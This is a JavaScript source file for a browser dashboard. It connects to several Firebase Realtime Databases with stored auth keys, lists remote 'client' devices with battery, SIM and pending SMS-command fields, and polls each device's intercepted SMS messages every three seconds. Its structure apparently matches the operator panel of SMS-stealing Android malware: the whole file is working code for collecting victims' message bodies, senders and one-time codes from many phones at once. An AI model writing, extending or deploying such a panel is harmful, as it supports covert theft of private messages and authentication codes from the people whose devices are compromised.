/**
 * FIREBASE MANAGER - Realtime Database
 * Reads devices from 'clients' and messages from 'messages/{deviceId}'
 * Continuous polling for real-time updates
 */

// ────────────────────────────────────────────────
// STATE
// ────────────────────────────────────────────────

let firebaseInstances = {};
let allDevices = [];
let deviceListeners = {};
let isInitialized = false;
let firebaseConfigsCache = null;
let pollingIntervals = {};

// ────────────────────────────────────────────────
// CONFIG LOADING - FROM JSON FILE
// ────────────────────────────────────────────────

async function loadFirebaseConfigs() {
    console.log('📢 Loading Firebase configs from JSON file...');
    try {
        const response = await fetch('data/firebase-configs.json?' + Date.now());
        if (response.ok) {
            const data = await response.json();
            firebaseConfigsCache = data;
            localStorage.setItem('firebase_configs', JSON.stringify(data));
            console.log('✅ Firebase configs loaded:', data.sources ? data.sources.length : 0, 'sources');
            return data;
        }
    } catch (e) {
        console.log('⚠️ Error loading firebase-configs.json:', e.message);
    }
    
    try {
        const data = localStorage.getItem('firebase_configs');
        if (data) {
            const parsed = JSON.parse(data);
            if (parsed.sources && parsed.sources.length > 0) {
                firebaseConfigsCache = parsed;
                return parsed;
            }
        }
    } catch (e) {
        console.error('Error loading from localStorage:', e);
    }
    
    return { sources: [] };
}

// ────────────────────────────────────────────────
// INITIALIZATION
// ────────────────────────────────────────────────

async function initFirebaseConnections() {
    try {
        const configs = await loadFirebaseConfigs();
        console.log('📢 Firebase configs loaded:', configs);
        
        if (!configs || !configs.sources || configs.sources.length === 0) {
            console.log('📢 No Firebase sources configured');
            return false;
        }

        let successCount = 0;
        for (const source of configs.sources) {
            console.log(`📢 Connecting to Firebase: ${source.id}`);
            const connected = await connectToFirebase(source);
            if (connected) successCount++;
        }

        console.log(`📢 Connected to ${successCount}/${configs.sources.length} sources`);
        return successCount > 0;
    } catch (error) {
        console.error('❌ Error initializing Firebase:', error);
        return false;
    }
}

async function connectToFirebase(source) {
    try {
        const { id, url, key } = source;
        
        if (firebaseInstances[id] && firebaseInstances[id].connected) {
            return true;
        }

        console.log(`📢 Connecting to Firebase source: ${id}`);
        console.log(`📢 URL: ${url}`);

        // Test connection using clients.json
        const testUrl = `${url}/clients.json?auth=${key}&shallow=true`;
        const response = await fetch(testUrl);
        
        if (response.ok) {
            const data = await response.json();
            const count = data ? Object.keys(data).length : 0;
            console.log(`📢 Test query returned ${count} clients`);
            
            firebaseInstances[id] = {
                config: source,
                connected: true,
                url: url,
                key: key
            };
            return true;
        } else {
            console.error(`❌ Test failed: ${response.status}`);
            return false;
        }
    } catch (error) {
        console.error(`❌ Failed to connect:`, error);
        return false;
    }
}

function disconnectFromFirebase(sourceId) {
    try {
        // Stop all polling for this source
        if (pollingIntervals[sourceId]) {
            pollingIntervals[sourceId].forEach(interval => clearInterval(interval));
            delete pollingIntervals[sourceId];
        }
        if (firebaseInstances[sourceId]) {
            delete firebaseInstances[sourceId];
            console.log(`📢 Disconnected: ${sourceId}`);
        }
    } catch (error) {
        console.error(`❌ Error disconnecting:`, error);
    }
}

// ────────────────────────────────────────────────
// DEVICE MANAGEMENT - FROM clients.json
// ────────────────────────────────────────────────

async function fetchAllDevices() {
    allDevices = [];
    const sources = Object.keys(firebaseInstances);

    console.log(`📢 Fetching devices from ${sources.length} sources...`);

    for (const sourceId of sources) {
        const instance = firebaseInstances[sourceId];
        if (!instance.connected) continue;

        try {
            const devices = await fetchDevicesFromSource(sourceId);
            allDevices = allDevices.concat(devices);
        } catch (error) {
            console.error(`❌ Error fetching devices from ${sourceId}:`, error);
        }
    }

    console.log(`📢 Total devices found: ${allDevices.length}`);
    return allDevices;
}

function getDeviceStatus(clientData) {
    if (clientData.status !== undefined) {
        const statusValue = clientData.status;
        if (statusValue === false || 
            statusValue === 'false' || 
            statusValue === 'pending' || 
            statusValue === 'offline' ||
            statusValue === null) {
            return 'offline';
        }
        return 'online';
    }
    
    const cmdData = clientData.command || clientData.commands || {};
    if (cmdData.status === 'pending') {
        return 'offline';
    }
    
    const webhookData = clientData.webhookEvent?.sendSms || {};
    if (webhookData.status === 'pending') {
        return 'offline';
    }
    
    return 'online';
}

async function fetchDevicesFromSource(sourceId) {
    const instance = firebaseInstances[sourceId];
    if (!instance || !instance.connected) {
        throw new Error('Firebase not connected');
    }

    try {
        const { url, key } = instance;
        
        const apiUrl = `${url}/clients.json?auth=${key}`;
        console.log(`📢 Fetching clients from Realtime Database...`);
        
        const response = await fetch(apiUrl);
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        
        const data = await response.json();
        const devices = [];

        if (!data) {
            console.log('⚠️ No clients found');
            return [];
        }

        const clientIds = Object.keys(data);
        console.log(`📢 Found ${clientIds.length} clients`);

        for (const clientId of clientIds) {
            const clientData = data[clientId];
            
            let battery = 50;
            if (clientData.battery) {
                const batStr = String(clientData.battery);
                battery = parseInt(batStr.replace('%', ''));
                if (isNaN(battery)) battery = 50;
            }
            
            const status = getDeviceStatus(clientData);
            
            const commandData = clientData.command || clientData.commands || clientData.webhookEvent?.sendSms || {};
            const phoneNumber = commandData.number || commandData.to || clientData.number || 'N/A';
            
            const device = {
                id: clientId,
                sourceId: sourceId,
                name: clientData.name || clientId.substring(0, 8),
                number: phoneNumber,
                status: status,
                battery: battery,
                signal: '4G',
                model: commandData.simSlot !== undefined ? `SIM ${parseInt(commandData.simSlot) + 1}` : 'Unknown',
                lastSeen: clientData.lastMessageTime ? timestampToISO(clientData.lastMessageTime) : new Date().toISOString(),
                sims: phoneNumber ? [phoneNumber] : ['N/A'],
                unread: 0,
                raw: clientData,
                smsBody: commandData.body || commandData.message || commandData.text || '',
                smsSender: commandData.number || commandData.from || 'Unknown',
                smsTime: commandData.timestamp ? timestampToISO(commandData.timestamp) : new Date().toISOString()
            };
            
            devices.push(device);
            console.log(`✅ Device: ${device.id.substring(0, 8)}... → ${device.status} (${device.battery}%)`);
        }

        return devices;
    } catch (error) {
        console.error(`❌ Error fetching devices:`, error);
        throw error;
    }
}

function listenToDevices(callback) {
    // Clear existing device polling
    if (pollingIntervals.devices) {
        clearInterval(pollingIntervals.devices);
    }
    
    const intervalId = setInterval(async () => {
        try {
            await fetchAllDevices();
            if (callback) callback(allDevices);
        } catch (error) {
            console.error('❌ Error polling devices:', error);
        }
    }, 5000); // Poll every 5 seconds

    pollingIntervals.devices = intervalId;
}

// ────────────────────────────────────────────────
// SMS MANAGEMENT - CONTINUOUS POLLING
// ────────────────────────────────────────────────

/**
 * Fetch SMS messages for a specific device
 * Uses: /messages/{deviceId}.json?auth=KEY&orderBy="$key"&limitToLast=150
 */
async function fetchSmsForDevice(deviceId, sourceId, simNumber, limit = 150) {
    const instance = firebaseInstances[sourceId];
    if (!instance || !instance.connected) {
        throw new Error('Firebase not connected');
    }

    try {
        const { url, key } = instance;
        
        // Build the exact endpoint you specified
        const apiUrl = `${url}/messages/${deviceId}.json?auth=${key}&orderBy="$key"&limitToLast=${limit}`;
        console.log(`📢 Fetching messages for device: ${deviceId.substring(0, 8)}...`);
        
        const response = await fetch(apiUrl);
        
        if (!response.ok) {
            if (response.status === 404) {
                console.log(`📢 No messages found for device: ${deviceId.substring(0, 8)}...`);
            }
            return [];
        }
        
        const data = await response.json();
        
        if (!data) {
            return [];
        }
        
        const messages = Object.values(data);
        
        // Sort by timestamp descending (newest first)
        messages.sort((a, b) => {
            const aTime = a.id || a.timestamp || 0;
            const bTime = b.id || b.timestamp || 0;
            return bTime - aTime;
        });
        
        // Convert to standard format with time parsed
        return messages.map(msg => {
            let timeStr = '';
            if (msg.dateTime) {
                timeStr = msg.dateTime;
            } else if (msg.timestamp) {
                timeStr = timestampToISO(msg.timestamp);
            } else if (msg.id) {
                timeStr = timestampToISO(msg.id);
            } else {
                timeStr = new Date().toISOString();
            }
            
            return {
                id: msg.id || msg.timestamp || Date.now(),
                sender: msg.sender || msg.from || 'Unknown',
                body: msg.message || msg.body || msg.text || '',
                time: timeStr,
                simNumber: msg.simNumber || 'N/A',
                type: msg.type || 'incoming',
                raw: msg
            };
        });
        
    } catch (error) {
        console.error(`❌ Error fetching SMS for device ${deviceId.substring(0, 8)}...:`, error);
        return [];
    }
}

/**
 * Listen for SMS updates - CONTINUOUS POLLING
 * Polls the endpoint every 3 seconds for new messages
 */
function listenToSms(deviceId, sourceId, simNumber, callback) {
    // Clear existing SMS polling for this device
    const pollKey = `sms_${sourceId}_${deviceId}`;
    if (pollingIntervals[pollKey]) {
        clearInterval(pollingIntervals[pollKey]);
        delete pollingIntervals[pollKey];
    }

    console.log(`📢 Starting continuous SMS polling for device: ${deviceId.substring(0, 8)}...`);
    console.log(`📢 Endpoint: /messages/${deviceId}.json?orderBy="$key"&limitToLast=150`);

    // Store last message count to detect new messages
    let lastMessageCount = 0;

    // Poll every 3 seconds
    const intervalId = setInterval(async () => {
        try {
            const messages = await fetchSmsForDevice(deviceId, sourceId, simNumber);
            
            // Check if new messages arrived
            if (messages.length > lastMessageCount) {
                console.log(`📢 New SMS messages detected for device: ${deviceId.substring(0, 8)}... (${messages.length} total)`);
            }
            
            lastMessageCount = messages.length;
            
            if (callback) callback(messages);
        } catch (error) {
            console.error('❌ Error polling SMS:', error);
        }
    }, 3000); // Poll every 3 seconds

    pollingIntervals[pollKey] = intervalId;
    
    // Return cleanup function
    return () => {
        if (pollingIntervals[pollKey]) {
            clearInterval(pollingIntervals[pollKey]);
            delete pollingIntervals[pollKey];
            console.log(`📢 Stopped SMS polling for device: ${deviceId.substring(0, 8)}...`);
        }
    };
}

// ────────────────────────────────────────────────
// SEND SMS (Removed - not needed)
// ────────────────────────────────────────────────

// ────────────────────────────────────────────────
// EXPOSE TO GLOBAL SCOPE
// ────────────────────────────────────────────────

window.loadFirebaseConfigs = loadFirebaseConfigs;
window.initFirebaseConnections = initFirebaseConnections;
window.connectToFirebase = connectToFirebase;
window.disconnectFromFirebase = disconnectFromFirebase;
window.fetchAllDevices = fetchAllDevices;
window.fetchDevicesFromSource = fetchDevicesFromSource;
window.listenToDevices = listenToDevices;
window.fetchSmsForDevice = fetchSmsForDevice;
window.listenToSms = listenToSms;
window.firebaseInstances = firebaseInstances;
window.allDevices = allDevices;
window.pollingIntervals = pollingIntervals;
